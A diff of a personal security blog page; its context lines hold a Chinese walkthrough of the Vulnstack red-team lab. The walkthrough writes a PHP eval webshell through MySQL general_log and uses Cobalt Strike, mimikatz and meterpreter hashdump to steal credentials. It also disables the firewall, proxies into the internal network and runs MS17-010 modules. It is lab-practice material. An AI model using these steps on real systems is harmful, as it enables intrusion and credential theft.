@@ -282,7 +282,7 @@ var _hmt = _hmt || [];
 <p>此时我的kaliIP为<code>192.168.80.129</code>win7外网IP为<code>192.168.80.128</code>后面变成了<code>192.168.90.131</code>，内网网段为<code>192.168.52.0/24</code>。</p>
 <h2 id="win7getshell"><a href="#win7getshell" class="headerlink" title="win7getshell"></a>win7getshell</h2><p>访问后，默认页面为phpstudy的php探针，于是在下面用root/root进行数据库连接测试，成功连接。</p>
 <p>用御剑扫描，存在phpmyadmin，访问后用root/root直接登录。查看general_log</p>
-<p><img src="img-20210407170900.png"></p>
+<p><img src="/2021/04/07/vulnstack(%E4%B8%80)%E9%9D%B6%E6%9C%BA/img-20210407170900.png"></p>
 <p>发现可以修改，于是开启general_log，并修改其存储位置为<code>C:/phpStudy/WWW/sha.php</code>（刚刚php探针看到的路径）。执行语句<code>select &lt;?php eval($_POST[a]);?&gt;</code>即可getshell。(蚁剑连上之后可以发现很多其他的漏洞，比如源码泄露啥的，就不说了)</p>
 <h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>msf和cs哪个上线都行，我习惯于cs上线然后msf直接挂代理打</p>
 <h3 id="cs和msf联动"><a href="#cs和msf联动" class="headerlink" title="cs和msf联动"></a>cs和msf联动</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42035825/article/details/105186616">https://blog.csdn.net/weixin_42035825/article/details/105186616</a></p>
@@ -294,10 +294,10 @@ var _hmt = _hmt || [];
 <h3 id="cs上线"><a href="#cs上线" class="headerlink" title="cs上线"></a>cs上线</h3><p>安装可以看我写的这篇文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44377940/article/details/106771776">https://blog.csdn.net/weixin_44377940/article/details/106771776</a></p>
 <p>这玩意我可以说是不太会用，有需要的话可以看这个<a target="_blank" rel="noopener" href="https://wbglil.gitbook.io/cobalt-strike/cobalt-strikeji-ben-shi-yong/jian-ting-qi-listener#beacon-http-and-beacon-https">https://wbglil.gitbook.io/cobalt-strike/cobalt-strikeji-ben-shi-yong/jian-ting-qi-listener#beacon-http-and-beacon-https</a></p>
 <p>先设置监听器：</p>
-<p><img src="./img-20210407174333.png"></p>
+<p><img src="/2021/04/07/vulnstack(%E4%B8%80)%E9%9D%B6%E6%9C%BA/img-20210407174333.png"></p>
 <p>再生成exe文件：</p>
-<p><img src="./img-20210407174644.png"></p>
-<p><img src="./img-20210407174732.png"></p>
+<p><img src="/2021/04/07/vulnstack(%E4%B8%80)%E9%9D%B6%E6%9C%BA/img-20210407174644.png"></p>
+<p><img src="/2021/04/07/vulnstack(%E4%B8%80)%E9%9D%B6%E6%9C%BA/img-20210407174732.png"></p>
 <p>将生成的exe文件上传到服务器上并运行即可。（记得关掉杀软）</p>
 <p>cs上线后，选定服务器，右键选择<code>interact</code>，即可进入beacon。</p>
 <p>我们设置心跳为0<code>sleep 0</code>（现实没这么舒服，默认60，即60s一次回显）然后即可执行命令了。</p>
@@ -306,7 +306,7 @@ var _hmt = _hmt || [];
 <p>我搭的环境好像有点问题，不能用<code>net user /domain</code>命令，会显示RPC不可用</p>
 <p>在cs上线之后，还可以用<code>mimikatz sekurlsa::logonpasswords</code>抓取密码</p>
 <p>msf上线可以用<code>run windows/gather/credentials/windows_autologin</code> 抓取自动登录的用户名和密码或<code>run hashdump </code>、<code>run windows/gather/smart_hashdump</code>获取哈希（后两条都是要system权限）</p>
-<p><img src="./img-2021-04-13112924.png"></p>
+<p><img src="/2021/04/07/vulnstack(%E4%B8%80)%E9%9D%B6%E6%9C%BA/img-2021-04-13112924.png"></p>
 <p>得到域为god.org，有三台主机，域控为192.168.52.138</p>
 <h3 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h3><p>因为<code>net user /domain</code>有问题，就重装了一下win7，之后域上不去了，显示该工作站与与主域之间的信任关系失败，然后按照百度经验的方法退域之后加域，发现加不上了，提示找不到域路径，只好重装所有环境，win7的外网地址就变成了<code>192.168.80.131</code></p>
 <h4 id="开启3389端口"><a href="#开启3389端口" class="headerlink" title="开启3389端口"></a>开启3389端口</h4><p>管理员权限，且需要关闭防火墙<code>net stop mpssvc</code></p>
@@ -331,7 +331,7 @@ var _hmt = _hmt || [];
 <p>该命令的意思是在web服务器上启动SOCKS5服务，并反弹到IP地址为192.168.80.128（kali）的1234端口上。</p>
 <p><code>/etc/proxychains.conf</code>修改内容如下，去掉dynamic_chain的注释，并且在最后的位置添加代理<code>127.0.0.1 1234</code>。</p>
 <p>域里有三台机子：</p>
-<p><img src="./img-2021-04-13112710.png"></p>
+<p><img src="/2021/04/07/vulnstack(%E4%B8%80)%E9%9D%B6%E6%9C%BA/img-2021-04-13112710.png"></p>
 <h4 id="路由转发后通过msf模块扫描"><a href="#路由转发后通过msf模块扫描" class="headerlink" title="路由转发后通过msf模块扫描"></a>路由转发后通过msf模块扫描</h4><p>通过msf的添加路由，使msf能通过192.168.80.131访问192.168.52.0/24</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt;run get_local_subnets #获取网段路由</span><br></pre></td></tr></table></figure>
 <p>如这里我获取的是</p>
@@ -344,7 +344,7 @@ var _hmt = _hmt || [];
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">auxiliary&#x2F;scanner&#x2F;portscan&#x2F;ack ACK防火墙扫描</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;portscan&#x2F;ftpbounce FTP跳端口扫描</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;portscan&#x2F;syn SYN端口扫描</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp TCP端口扫描</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;portscan&#x2F;xmas TCP&quot;XMas&quot;端口扫描</span><br></pre></td></tr></table></figure>
 <h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>发现了机器之后进行漏洞扫描<code>nmap --script=vuln 192.168.52.138</code>或搭建nessus经过代理进入内网。</p>
 <p>这次我们用nmap扫描一下，得到一个漏洞：</p>
-<p><img src="./img-20210413153142.png"></p>
+<p><img src="/2021/04/07/vulnstack(%E4%B8%80)%E9%9D%B6%E6%9C%BA/img-20210413153142.png"></p>
 <p>用msf的模块打了一下，直接把我VM打炸了，打算试试其他的，但看到mimikatz读取出来的密码是初始密码（顺带一提，mimikatz是读取lsass.exe进程中保存的令牌然后进行破解，win10好像已经不行了，要魔改），不是我修改后的密码，我就知道不可能用网上的SMB大法了（SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效。）。</p>
 <p>把靶机放在服务器上之后好多了，kali地址变成了172.16.43.52，win7的IP变成了172.16.43.8。继续开工，不过msf和cs联动就不整了，直接挂代理吧</p>
 <p>继续打，打了一趟，发现原来是蓝屏了，这tm就很尴尬了。试了一下，发现只有<code>exploit/windows/smb/ms17_010_psexec</code>和<code>auxiliary/admin/smb/ms17_010_command</code>能用。</p>
@@ -356,9 +356,9 @@ var _hmt = _hmt || [];
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 172.16.43.8 #win7的IP</span><br><span class="line">server_port &#x3D; 7010</span><br><span class="line"></span><br><span class="line">[ssh]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 172.16.43.52#kali的IP</span><br><span class="line">local_port &#x3D; 8000</span><br><span class="line">remote_port &#x3D; 6000</span><br></pre></td></tr></table></figure>
 <p>此时，我访问win7的6000端口时，相当于访问kali的8000端口</p>
 <p>再开一个不用代理的msf，配置如下：</p>
-<p><img src="./image-20210608220705.png"></p>
+<p><img src="/2021/04/07/vulnstack(%E4%B8%80)%E9%9D%B6%E6%9C%BA/image-20210608220705.png"></p>
 <p>再利用代理的msf进行攻击，配置如下：</p>
-<p><img src="./imag-20210608221729.png"></p>
+<p><img src="/2021/04/07/vulnstack(%E4%B8%80)%E9%9D%B6%E6%9C%BA/imag-20210608221729.png"></p>
 <p>然后可以在没代理的msf上得到session。</p>
 <p>红日团队的打法：<a target="_blank" rel="noopener" href="https://www.freebuf.com/column/231111.html">ATT&amp;CK实战 | Vulnstack 红队（一） - FreeBuf网络安全行业门户</a></p>
 <p>写的有点乱，中间隔了太久，见谅。</p>
@@ -576,7 +576,7 @@ gitalk.render('gitalk-container')
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2021-2022 <a href="https://sn1per-ssd.github.io/" target="_blank">Sn1pEr</a>
+    		&copy; 2021-2024 <a href="https://sn1per-ssd.github.io/" target="_blank">Sn1pEr</a>
     	</div>
       	<div class="footer-right">
 			
@@ -699,11 +699,19 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">代码审计</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+                <a href="javascript:void(0)" class="js-tag color3">dedecms</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -719,23 +727,19 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">代码审计</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">dedecms</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">hexo</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">木马</a>
+                <a href="javascript:void(0)" class="js-tag color5">java</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">tomcat</a>
+                <a href="javascript:void(0)" class="js-tag color3">范围</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">配置</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -759,6 +763,14 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">木马</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">tomcat</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
               </li>
              
@@ -779,11 +791,19 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Misc</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">代理</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">yii</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Misc</a>
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -799,15 +819,7 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">代理</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">python</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">tips</a>
+                <a href="javascript:void(0)" class="js-tag color5">源码泄露</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -815,7 +827,7 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">源码泄露</a>
+                <a href="javascript:void(0)" class="js-tag color5">tips</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -823,11 +835,15 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">javascript</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">汇编语言</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">javascript</a>
+                <a href="javascript:void(0)" class="js-tag color5">绕过方法</a>
               </li>
              
               <li class="article-tag-list-item">
